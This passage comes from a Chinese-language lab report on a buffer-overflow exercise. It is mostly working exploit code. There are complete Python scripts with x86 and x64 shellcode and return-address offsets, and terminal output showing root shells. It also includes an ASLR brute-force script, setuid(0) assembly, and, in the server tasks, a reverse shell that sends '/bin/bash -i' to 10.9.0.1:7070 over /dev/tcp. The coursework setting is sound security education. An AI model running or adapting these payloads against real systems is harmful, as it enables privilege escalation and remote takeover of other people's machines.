class="line">start = <span class="number">517</span> - <span class="built_in">len</span>(shellcode)            <span class="comment"># Change this number </span></span><br><span class="line">content[start:start + <span class="built_in">len</span>(shellcode)] = shellcode</span><br><span class="line"></span><br><span class="line"><span class="comment"># Decide the return address value </span></span><br><span class="line"><span class="comment"># and put it somewhere in the payload</span></span><br><span class="line">ret    = <span class="number">0xffffc898</span> + <span class="number">232</span>        <span class="comment"># Change this number </span></span><br><span class="line">offset = <span class="number">207</span>              <span class="comment"># Change this number </span></span><br><span class="line"></span><br><span class="line">L = <span class="number">4</span>     <span class="comment"># Use 4 for 32-bit address and 8 for 64-bit address</span></span><br><span class="line">content[<span class="number">0</span>:offset + L] = (ret).to_bytes(L,byteorder=<span class="string">&#x27;little&#x27;</span>)*<span class="number">52</span> </span><br><span class="line"><span class="comment">##################################################################</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Write the content to a file</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;badfile&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">  f.write(content)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>结果获取到root权限的shell。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">❯ python3 exploit-L2.py</span><br><span class="line">❯ ./stack-L2</span><br><span class="line">Input size: <span class="number">514</span></span><br><span class="line"><span class="comment"># whoami                                                                       </span></span><br><span class="line">root</span><br><span class="line"><span class="comment">#  </span></span><br></pre></td></tr></table></figure>

<h3 id="Task5：针对64位程序的攻击"><a href="#Task5：针对64位程序的攻击" class="headerlink" title="Task5：针对64位程序的攻击"></a>Task5：针对64位程序的攻击</h3><p>64位程序与32位程序类似，但是由于地址前4位均为0，如果直接输入会导致strcpy函数遇<code>\x00</code>截断，导致shellcode无法进栈，因此可以考虑通过将shellcode放在ret前。python脚本构造如下：</p>
<p><code>python</code></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="comment"># Replace the content with the actual shellcode</span></span><br><span class="line">shellcode= (</span><br><span class="line">  <span class="string">&quot;\x48\x31\xd2\x52\x48\xb8\x2f\x62\x69\x6e&quot;</span></span><br><span class="line">  <span class="string">&quot;\x2f\x2f\x73\x68\x50\x48\x89\xe7\x52\x57&quot;</span></span><br><span class="line">  <span class="string">&quot;\x48\x89\xe6\x48\x31\xc0\xb0\x3b\x0f\x05&quot;</span></span><br><span class="line">).encode(<span class="string">&#x27;latin-1&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Fill the content with NOP&#x27;s</span></span><br><span class="line">content = <span class="built_in">bytearray</span>(<span class="number">0x90</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">517</span>)) </span><br><span class="line"></span><br><span class="line"><span class="comment">##################################################################</span></span><br><span class="line"><span class="comment"># Put the shellcode somewhere in the payload</span></span><br><span class="line">start = <span class="number">40</span>            <span class="comment"># Change this number </span></span><br><span class="line">content[start:start + <span class="built_in">len</span>(shellcode)] = shellcode</span><br><span class="line"></span><br><span class="line"><span class="comment"># Decide the return address value </span></span><br><span class="line"><span class="comment"># and put it somewhere in the payload</span></span><br><span class="line">ret    = <span class="number">0x7fffffffd5b0</span>+<span class="number">220</span>      <span class="comment"># Change this number </span></span><br><span class="line">offset = <span class="number">208</span>+<span class="number">8</span>              <span class="comment"># Change this number </span></span><br><span class="line"></span><br><span class="line">L = <span class="number">8</span>     <span class="comment"># Use 4 for 32-bit address and 8 for 64-bit address</span></span><br><span class="line"><span class="comment"># content[0:offset+L] = (ret).to_bytes(L,byteorder=&#x27;little&#x27;)*29</span></span><br><span class="line">content[offset:offset+L] = (ret).to_bytes(L,byteorder=<span class="string">&#x27;little&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>((ret).to_bytes(L,byteorder=<span class="string">&#x27;little&#x27;</span>))</span><br><span class="line"><span class="comment">##################################################################</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Write the content to a file</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;badfile&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">  f.write(content)</span><br></pre></td></tr></table></figure>

<p>成功获得root权限shell：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">❯ python3 exploit-L3.py</span><br><span class="line">b&#x27;\x8c\xd6\xff\xff\xff\x7f\x00\x00&#x27;</span><br><span class="line">❯ ./stack-L3</span><br><span class="line">Input size: 517</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="built_in">whoami</span></span>                                                                       </span><br><span class="line">root</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="built_in">exit</span></span>                                                                         </span><br></pre></td></tr></table></figure>

<h3 id="Task6：攻击64位程序（buffer很小）"><a href="#Task6：攻击64位程序（buffer很小）" class="headerlink" title="Task6：攻击64位程序（buffer很小）"></a>Task6：攻击64位程序（buffer很小）</h3><p>由于buffer size变小，不足以插入shellcode，可以考虑利用在main函数中参数中出现的shellcode。gdb调试如下，记录shellcode的所在地址，令<code>ret=0x7fffffffdca0 + 220</code>，即可成功跳转到shellcode</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">stack 70</span></span><br><span class="line">00:0000│ rsp 0x7fffffffdab0 —▸ 0x7fffffffddf8 —▸ 0x7fffffffe18d ◂— &#x27;/home/bronya/Documents/SJTU/lab/buffer-overflow/setuid/Labsetup/code/stack-L4-dbg&#x27;</span><br><span class="line">01:0008│     0x7fffffffdab8 ◂— 0x100000000</span><br><span class="line">02:0010│     0x7fffffffdac0 ◂— 0x9090909090909090</span><br><span class="line">03:0018│     0x7fffffffdac8 ◂— 0x9090909090909090</span><br><span class="line">04:0020│     0x7fffffffdad0 ◂— 0x7fffffffd6909090</span><br><span class="line">05:0028│     0x7fffffffdad8 ◂— 0x9090909090900000</span><br><span class="line">06:0030│     0x7fffffffdae0 ◂— 0x9090909090909090</span><br><span class="line">... ↓        55 skipped</span><br><span class="line">3e:01f0│     0x7fffffffdca0 ◂— 0x622fb84852d23148</span><br><span class="line">3f:01f8│     0x7fffffffdca8 ◂— 0x485068732f2f6e69 (&#x27;in//shPH&#x27;)</span><br><span class="line">40:0200│     0x7fffffffdcb0 ◂— 0x48e689485752e789</span><br><span class="line">41:0208│     0x7fffffffdcb8 ◂— 0x9090050f3bb0c031</span><br><span class="line">42:0210│     0x7fffffffdcc0 ◂— 0x7f9090909090</span><br><span class="line">43:0218│     0x7fffffffdcc8 ◂— 0x64 /* &#x27;d&#x27; */</span><br><span class="line">44:0220│     0x7fffffffdcd0 ◂— 0x20500001000</span><br><span class="line">45:0228│     0x7fffffffdcd8 —▸ 0x5555555592a0 ◂— 0xfbad2488</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><code>python脚本如下</code></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="comment"># Replace the content with the actual shellcode</span></span><br><span class="line">shellcode= (</span><br><span class="line">  <span class="string">&quot;\x48\x31\xd2\x52\x48\xb8\x2f\x62\x69\x6e&quot;</span></span><br><span class="line">  <span class="string">&quot;\x2f\x2f\x73\x68\x50\x48\x89\xe7\x52\x57&quot;</span></span><br><span class="line">  <span class="string">&quot;\x48\x89\xe6\x48\x31\xc0\xb0\x3b\x0f\x05&quot;</span></span><br><span class="line">).encode(<span class="string">&#x27;latin-1&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Fill the content with NOP&#x27;s</span></span><br><span class="line">content = <span class="built_in">bytearray</span>(<span class="number">0x90</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">517</span>)) </span><br><span class="line"></span><br><span class="line"><span class="comment">##################################################################</span></span><br><span class="line"><span class="comment"># Put the shellcode somewhere in the payload</span></span><br><span class="line">start = <span class="number">517</span> - <span class="number">7</span> - <span class="built_in">len</span>(shellcode)            <span class="comment"># Change this number </span></span><br><span class="line">content[start:start + <span class="built_in">len</span>(shellcode)] = shellcode</span><br><span class="line"></span><br><span class="line"><span class="comment"># Decide the return address value </span></span><br><span class="line"><span class="comment"># and put it somewhere in the payload</span></span><br><span class="line">ret    = <span class="number">0x7fffffffdca0</span> + <span class="number">220</span>      <span class="comment"># Change this number </span></span><br><span class="line">offset = <span class="number">10</span>+<span class="number">8</span>              <span class="comment"># Change this number </span></span><br><span class="line"></span><br><span class="line">L = <span class="number">8</span>     <span class="comment"># Use 4 for 32-bit address and 8 for 64-bit address</span></span><br><span class="line"><span class="comment"># content[0:offset+L] = (ret).to_bytes(L,byteorder=&#x27;little&#x27;)*29</span></span><br><span class="line">content[offset:offset+L] = (ret).to_bytes(L,byteorder=<span class="string">&#x27;little&#x27;</span>)</span><br><span class="line"><span class="comment">##################################################################</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Write the content to a file</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;badfile&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">  f.write(content)</span><br></pre></td></tr></table></figure>

<p>成功获取root权限下的shell</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">❯ python3 exploit-L4.py</span><br><span class="line">❯ ./stack-L4</span><br><span class="line">Input size: 517</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="built_in">whoami</span></span>                                                                       </span><br><span class="line">root</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="built_in">exit</span></span>    </span><br></pre></td></tr></table></figure>

<h3 id="Task-7：Defeating-dash’s-Countermeasure"><a href="#Task-7：Defeating-dash’s-Countermeasure" class="headerlink" title="Task 7：Defeating dash’s Countermeasure"></a>Task 7：Defeating dash’s Countermeasure</h3><p>输入命令改回设置</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">❯ sudo ln -sf /bin/dash /bin/sh</span><br></pre></td></tr></table></figure>

<p>修改call_shellcode.c，将setuid的汇编代码加入到shellcode中，重新编译并运行，可以发现shell具有root权限。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">❯ make setuid</span><br><span class="line">gcc -m32 -z execstack -o a32.out call_shellcode.c</span><br><span class="line">gcc -z execstack -o a64.out call_shellcode.c</span><br><span class="line">sudo chown root a32.out a64.out</span><br><span class="line">[sudo] bronya 的密码： </span><br><span class="line">sudo chmod 4755 a32.out a64.out</span><br><span class="line">❯ ./a32.out</span><br><span class="line">sh-5.1# whoami</span><br><span class="line">root</span><br><span class="line">sh-5.1# exit</span><br><span class="line">exit</span><br><span class="line">❯ ./a64.out</span><br><span class="line">sh-5.1# whoami</span><br><span class="line">root</span><br><span class="line">sh-5.1# exit</span><br><span class="line">exit</span><br></pre></td></tr></table></figure>

<p>setuid（0）汇编语言如下，可见主要操作为将real uid设置为0，即root用户的uid，这样当bash执行文件时会发现real id与拥有者id一致，因此不会限制权限。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">; Invoke setuid(0): 32-bit</span><br><span class="line">xor ebx, ebx ; ebx = 0: setuid()’s argument</span><br><span class="line">xor eax, eax</span><br><span class="line">mov al, 0xd5 ; setuid()’s system call number</span><br><span class="line">int 0x80</span><br><span class="line">; Invoke setuid(0): 64-bit</span><br><span class="line">xor rdi, rdi ; rdi = 0: setuid()’s argument</span><br><span class="line">xor rax, rax</span><br><span class="line">mov al, 0x69 ; setuid()’s system call number</span><br><span class="line">syscall</span><br></pre></td></tr></table></figure>

<h3 id="Task-8-Defeating-Address-Randomization"><a href="#Task-8-Defeating-Address-Randomization" class="headerlink" title="Task 8: Defeating Address Randomization"></a>Task 8: Defeating Address Randomization</h3><p>在32位机器上，由于栈比较小，可以通过暴力破解的方式来攻破ASLR地址随机化。</p>
<p>运行命令重新开启ASLR机制：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">❯ sudo /sbin/sysctl -w kernel.randomize_va_space=2</span><br><span class="line">kernel.randomize_va_space = 2</span><br></pre></td></tr></table></figure>

<p>尝试攻击stack-L1，可以发现报错，由于ASLR随机了栈基址，导致ret的值失效。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">❯ python3 exploit-L1.py</span><br><span class="line">❯ ./stack-L1</span><br><span class="line">Input size: 517</span><br><span class="line">[1]    12494 segmentation fault (core dumped)  ./stack-L1</span><br></pre></td></tr></table></figure>

<p>使用暴力破解的方式来尝试攻击，运行脚本，由于随机性较强，没有解出：</p>
<p>![暴力破解](&#x2F;img&#x2F;posts&#x2F;2023-10-25-【SEED_Lab】缓冲区溢出实验报告&#x2F;images_</p>
<p>setuid&#x2F;暴力破解.png)</p>
<p>暴力破解脚本如下，主要执行了循环进行攻击的操作。</p>
<p><code>brute_force.sh</code></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/bash</span></span><br><span class="line">SECONDS=0</span><br><span class="line">value=0</span><br><span class="line"></span><br><span class="line">while true; do</span><br><span class="line">  value=$(( $value + 1 ))</span><br><span class="line">  duration=$SECONDS</span><br><span class="line">  min=$(($duration / 60))</span><br><span class="line">  sec=$(($duration % 60))</span><br><span class="line">  echo &quot;$min minutes and $sec seconds elapsed.&quot;</span><br><span class="line">  echo &quot;The program has been running $value times so far.&quot;</span><br><span class="line">  ./stack-L1</span><br><span class="line">done</span><br></pre></td></tr></table></figure>

<h3 id="Task-9：Experimenting-with-Other-Countermeasures"><a href="#Task-9：Experimenting-with-Other-Countermeasures" class="headerlink" title="Task 9：Experimenting with Other Countermeasures"></a>Task 9：Experimenting with Other Countermeasures</h3><ol>
<li><p><strong>Task 9.a: Turn on the StackGuard Protection</strong>  </p>
<p>开启StackGuard防护。使用gcc命令重新编译stack-L1，尝试进行攻击</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">❯ ./stack</span><br><span class="line">Input size: 517</span><br><span class="line">*** stack smashing detected ***: terminated</span><br><span class="line">[1]    19472 IOT instruction (core dumped)  ./stack</span><br></pre></td></tr></table></figure>

<p>可以发现，stack smashing detected，表明检测到栈溢出，自动停止程序运行。</p>
</li>
<li><p><strong>Task 9.b: Turn on the Non-executable Stack Protection</strong>  </p>
<p>开启DEP防护，重新编译a32out，a64out，查看结果，发现无法弹出shell，说明数据段中代码不可执行，无法成功攻击。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">❯ gcc -DBUF_SIZE=100 -m32 -o a32.out -fno-stack-protector call_shellcode.c</span><br><span class="line"></span><br><span class="line">❯ gcc -DBUF_SIZE=100 -m64 -o a64.out -fno-stack-protector call_shellcode.c</span><br><span class="line"></span><br><span class="line">❯ sudo chmod 4755 a32.out</span><br><span class="line">[sudo] bronya 的密码： </span><br><span class="line">❯ sudo chmod 4755 a64.out</span><br><span class="line">❯ sudo chown root a32.out</span><br><span class="line">❯ sudo chown root a64.out</span><br><span class="line">❯ ./a64.out</span><br><span class="line">[1]    25967 segmentation fault (core dumped)  ./a64.out</span><br><span class="line">❯ ./a32.out</span><br><span class="line">[1]    26060 segmentation fault (core dumped)  ./a32.out</span><br></pre></td></tr></table></figure></li>
</ol>
<h2 id="stack-overflow-Server"><a href="#stack-overflow-Server" class="headerlink" title="stack-overflow(Server)"></a>stack-overflow(Server)</h2><h3 id="环境配置-1"><a href="#环境配置-1" class="headerlink" title="环境配置"></a>环境配置</h3><p>关闭ASLR</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo /sbin/sysctl -w kernel.randomize_va_space=0</span><br></pre></td></tr></table></figure>

<p>漏洞程序分析，程序中bof函数存在漏洞，原理同stack-overflow(setuid)。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="comment">/* Changing this size will change the layout of the stack.</span></span><br><span class="line"><span class="comment">* Instructors can change this value each year, so students</span></span><br><span class="line"><span class="comment">* won’t be able to use the solutions from the past. */</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> BUF_SIZE</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BUF_SIZE 100</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">bof</span><span class="params">(<span class="type">char</span> *str)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">char</span> buffer[BUF_SIZE];</span><br><span class="line"><span class="comment">/* The following statement has a buffer overflow problem */</span></span><br><span class="line"><span class="built_in">strcpy</span>(buffer, str); P</span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> **argv)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">char</span> str[<span class="number">517</span>];</span><br><span class="line"><span class="type">int</span> length = fread(str, <span class="keyword">sizeof</span>(<span class="type">char</span>), <span class="number">517</span>, <span class="built_in">stdin</span>);</span><br><span class="line">bof(str);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stdout</span>, <span class="string">&quot;==== Returned Properly ====\n&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>编译程序：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">❯ make</span><br><span class="line">gcc -o server server.c</span><br><span class="line">gcc -DBUF_SIZE=100 -DSHOW_FP -z execstack -fno-stack-protector -static -m32 -o stack-L1 stack.c</span><br><span class="line">gcc -DBUF_SIZE=180 -z execstack -fno-stack-protector -static -m32 -o stack-L2 stack.c</span><br><span class="line">gcc -DBUF_SIZE=200 -DSHOW_FP -z execstack -fno-stack-protector -o stack-L3 stack.c</span><br><span class="line">gcc -DBUF_SIZE=80 -DSHOW_FP -z execstack -fno-stack-protector -o stack-L4 stack.c</span><br><span class="line">❯ make install</span><br><span class="line">cp server ../bof-containers</span><br><span class="line">cp stack-* ../bof-containers</span><br></pre></td></tr></table></figure>

<p>建立docker镜像：</p>
<p><img src="/img/posts/2023-10-25-%E3%80%90SEED_Lab%E3%80%91%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A/images_server/docker.png" alt="docker"></p>
<h3 id="Task-1：Get-Familiar-with-the-Shellcode"><a href="#Task-1：Get-Familiar-with-the-Shellcode" class="headerlink" title="Task 1：Get Familiar with the Shellcode"></a>Task 1：Get Familiar with the Shellcode</h3><p>shellcode基本原理为执行命令”&#x2F;bin&#x2F;sh”，从而获取shell</p>
<p>shellcode_32.py, shellcode_64.py运行，编译call_shellcode.c，运行文件，执行codefile</p>
<p><img src="/img/posts/2023-10-25-%E3%80%90SEED_Lab%E3%80%91%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A/images_server/shellcode.png"></p>
<p>修改shellcode_32.py，使其codefile可以删除文件（shellcode_64同理）：</p>
<p><img src="/img/posts/2023-10-25-%E3%80%90SEED_Lab%E3%80%91%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A/images_server/%E4%BF%AE%E6%94%B9shellcode.png" alt="修改shellcode"></p>
<h3 id="Task-2：Level-1-Attack"><a href="#Task-2：Level-1-Attack" class="headerlink" title="Task 2：Level-1 Attack"></a>Task 2：Level-1 Attack</h3><p>使用<code>echo hello | nc 10.9.0.5 9090</code>命令连接server1 9090端口，建立TCP连接后服务端会自动运行stack程序。</p>
<p><img src="/img/posts/2023-10-25-%E3%80%90SEED_Lab%E3%80%91%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A/images_server/%E6%B5%8B%E8%AF%95%E6%9C%8D%E5%8A%A1nc.png" alt="测试服务nc"></p>
<p>根据ebp地址和buffer地址，构造python脚本如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">shellcode = (</span><br><span class="line">   <span class="string">&quot;\xeb\x29\x5b\x31\xc0\x88\x43\x09\x88\x43\x0c\x88\x43\x47\x89\x5b&quot;</span></span><br><span class="line">   <span class="string">&quot;\x48\x8d\x4b\x0a\x89\x4b\x4c\x8d\x4b\x0d\x89\x4b\x50\x89\x43\x54&quot;</span></span><br><span class="line">   <span class="string">&quot;\x8d\x4b\x48\x31\xd2\x31\xc0\xb0\x0b\xcd\x80\xe8\xd2\xff\xff\xff&quot;</span></span><br><span class="line">   <span class="string">&quot;/bin/bash*&quot;</span></span><br><span class="line">   <span class="string">&quot;-c*&quot;</span></span><br><span class="line">   <span class="comment"># You can modify the following command string to run any command.</span></span><br><span class="line">   <span class="comment"># You can even run multiple commands. When you change the string,</span></span><br><span class="line">   <span class="comment"># make sure that the position of the * at the end doesn&#x27;t change.</span></span><br><span class="line">   <span class="comment"># The code above will change the byte at this position to zero,</span></span><br><span class="line">   <span class="comment"># so the command string ends here.</span></span><br><span class="line">   <span class="comment"># You can delete/add spaces, if needed, to keep the position the same. </span></span><br><span class="line">   <span class="comment"># The * in this line serves as the position marker         * </span></span><br><span class="line">   <span class="string">&quot;/bin/bash	-i &gt;/dev/tcp/10.9.0.1/7070 0&lt;&amp;1 2&gt;&amp;1          *&quot;</span></span><br><span class="line">   <span class="string">&quot;AAAA&quot;</span>   <span class="comment"># Placeholder for argv[0] --&gt; &quot;/bin/bash&quot;</span></span><br><span class="line">   <span class="string">&quot;BBBB&quot;</span>   <span class="comment"># Placeholder for argv[1] --&gt; &quot;-c&quot;</span></span><br><span class="line">   <span class="string">&quot;CCCC&quot;</span>   <span class="comment"># Placeholder for argv[2] --&gt; the command string</span></span><br><span class="line">   <span class="string">&quot;DDDD&quot;</span>   <span class="comment"># Placeholder for argv[3] --&gt; NULL</span></span><br><span class="line">).encode(<span class="string">&#x27;latin-1&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Fill the content with NOP&#x27;s</span></span><br><span class="line">content = <span class="built_in">bytearray</span>(<span class="number">0x90</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">517</span>)) </span><br><span class="line"></span><br><span class="line"><span class="comment">##################################################################</span></span><br><span class="line"><span class="comment"># Put the shellcode somewhere in the payload</span></span><br><span class="line">start = <span class="number">517</span> - <span class="built_in">len</span>(shellcode)               <span class="comment"># Change this number </span></span><br><span class="line">content[start:start + <span class="built_in">len</span>(shellcode)] = shellcode</span><br><span class="line"></span><br><span class="line"><span class="comment"># Decide the return address value </span></span><br><span class="line"><span class="comment"># and put it somewhere in the payload</span></span><br><span class="line">ret    = <span class="number">0xffffd7e8</span>     <span class="comment"># Change this number </span></span><br><span class="line">offset = <span class="number">0xffffd7e8</span> - <span class="number">0xffffd778</span> + <span class="number">4</span>              <span class="comment"># Change this number </span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Use 4 for 32-bit address and 8 for 64-bit address</span></span><br><span class="line">content[offset:offset + <span class="number">4</span>] = (ret).to_bytes(<span class="number">4</span>,byteorder=<span class="string">&#x27;little&#x27;</span>) </span><br><span class="line"><span class="comment">##################################################################</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Write the content to a file</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;badfile&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">  f.write(content)</span><br></pre></td></tr></table></figure>

<p>结果成功获取到root权限shell。</p>
<p><img src="/img/posts/2023-10-25-%E3%80%90SEED_Lab%E3%80%91%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A/images_server/level1-result.png" alt="level1-result"></p>
<h3 id="Task-3：Level-2-Attack"><a href="#Task-3：Level-2-Attack" class="headerlink" title="Task 3：Level-2 Attack"></a>Task 3：Level-2 Attack</h3><p>buffer大小未知，可以通过喷射法来填充大量地址。</p>
<p>向server2发送nc连接请求，获取到buffer地址</p>
<p>![server2-echo hello](&#x2F;img&#x2F;posts&#x2F;2023-10-25-【SEED_Lab】缓冲区溢出实验报告&#x2F;images_server&#x2F;server2-echo hello.png)</p>
<p>构造python脚本：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">shellcode = (</span><br><span class="line">   <span class="string">&quot;\xeb\x29\x5b\x31\xc0\x88\x43\x09\x88\x43\x0c\x88\x43\x47\x89\x5b&quot;</span></span><br><span class="line">   <span class="string">&quot;\x48\x8d\x4b\x0a\x89\x4b\x4c\x8d\x4b\x0d\x89\x4b\x50\x89\x43\x54&quot;</span></span><br><span class="line">   <span class="string">&quot;\x8d\x4b\x48\x31\xd2\x31\xc0\xb0\x0b\xcd\x80\xe8\xd2\xff\xff\xff&quot;</span></span><br><span class="line">   <span class="string">&quot;/bin/bash*&quot;</span></span><br><span class="line">   <span class="string">&quot;-c*&quot;</span></span><br><span class="line">   <span class="comment"># You can modify the following command string to run any command.</span></span><br><span class="line">   <span class="comment"># You can even run multiple commands. When you change the string,</span></span><br><span class="line">   <span class="comment"># make sure that the position of the * at the end doesn&#x27;t change.</span></span><br><span class="line">   <span class="comment"># The code above will change the byte at this position to zero,</span></span><br><span class="line">   <span class="comment"># so the command string ends here.</span></span><br><span class="line">   <span class="comment"># You can delete/add spaces, if needed, to keep the position the same. </span></span><br><span class="line">   <span class="comment"># The * in this line serves as the position marker         * </span></span><br><span class="line">   <span class="string">&quot;/bin/bash -i &gt; /dev/tcp/10.9.0.1/7070 0&lt;&amp;1 2&gt;&amp;1           *&quot;</span></span><br><span class="line">   <span class="string">&quot;AAAA&quot;</span>   <span class="comment"># Placeholder for argv[0] --&gt; &quot;/bin/bash&quot;</span></span><br><span class="line">   <span class="string">&quot;BBBB&quot;</span>   <span class="comment"># Placeholder for argv[1] --&gt; &quot;-c&quot;</span></span><br><span class="line">   <span class="string">&quot;CCCC&quot;</span>   <span class="comment"># Placeholder for argv[2] --&gt; the command string</span></span><br><span class="line">   <span class="string">&quot;DDDD&quot;</span>   <span class="comment"># Placeholder for argv[3] --&gt; NULL</span></span><br><span class="line">).encode(<span class="string">&#x27;latin-1&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Fill the content with NOP&#x27;s</span></span><br><span class="line">content = <span class="built_in">bytearray</span>(<span class="number">0x90</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">517</span>)) </span><br><span class="line"></span><br><span class="line"><span class="comment">##################################################################</span></span><br><span class="line"><span class="comment"># Put the shellcode somewhere in the payload</span></span><br><span class="line">start = <span class="number">517</span> - <span class="built_in">len</span>(shellcode)               <span class="comment"># Change this number </span></span><br><span class="line">content[start:start + <span class="built_in">len</span>(shellcode)] = shellcode</span><br><span class="line"></span><br><span class="line"><span class="comment"># Decide the return address value </span></span><br><span class="line"><span class="comment"># and put it somewhere in the payload</span></span><br><span class="line">ret    = <span class="number">0xffffd728</span> + start    <span class="comment"># Change this number </span></span><br><span class="line">offset = <span class="number">300</span>              <span class="comment"># Change this number </span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Use 4 for 32-bit address and 8 for 64-bit address</span></span><br><span class="line">content[<span class="number">0</span>:offset + <span class="number">4</span>] = (ret).to_bytes(<span class="number">4</span>,byteorder=<span class="string">&#x27;little&#x27;</span>)*<span class="number">76</span></span><br><span class="line"><span class="comment">##################################################################</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Write the content to a file</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;badfile&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">  f.write(content)</span><br></pre></td></tr></table></figure>



<p>获取到shell</p>
<p><img src="/img/posts/2023-10-25-%E3%80%90SEED_Lab%E3%80%91%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A/images_server/level2-result.png" alt="level2-result"></p>
<h3 id="Task-4：Level-3-Attack"><a href="#Task-4：Level-3-Attack" class="headerlink" title="Task 4：Level-3 Attack"></a>Task 4：Level-3 Attack</h3><p>向server3发送nc连接请求，发现可以看到rbp和buffer地址。通过将shellcode放在ret前解决。</p>
